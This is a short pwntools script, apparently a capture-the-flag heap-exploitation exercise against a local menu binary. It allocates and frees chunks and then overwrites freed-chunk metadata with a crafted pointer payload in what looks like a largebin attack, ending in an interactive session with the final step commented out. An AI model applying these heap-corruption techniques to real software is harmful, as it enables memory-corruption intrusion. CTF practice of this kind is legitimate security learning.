from pwn import *

elf = context.binary = ELF("./main")
context.log_level = "debug"


io = process()


def malloc(index, size):
  io.sendlineafter(b">>", b"1")
  io.sendlineafter(b">>", str(index))
  io.sendlineafter(b">>", str(size))


def calloc(index, size):
  io.sendlineafter(b">>", b"2")
  io.sendlineafter(b">>", str(index))
  io.sendlineafter(b">>", str(size))


def free(index):
  io.sendlineafter(b">>", b"3")
  io.sendlineafter(b">>", str(index))


def edit(index, payload):
  io.sendlineafter(b">>", b"4")
  io.sendlineafter(b">>", str(index))
  io.sendline(payload)


def view(index):
  io.sendlineafter(b">>", b"5")
  io.sendlineafter(b">>", str(index))


gdb.attach(io)

malloc(0x0, 0x428)

malloc(0x1, 0x18)

malloc(0x2, 0x418)

malloc(0x3, 0x18)

free(0x0)

malloc(0x4, 0x438)

free(0x2)

payload = pack(0x0) * 0x2 + pack(0x0) + pack(0x5555555596D0 - 0x20)
edit(0x0, payload)


# malloc(0x5,0x438)


io.interactive()
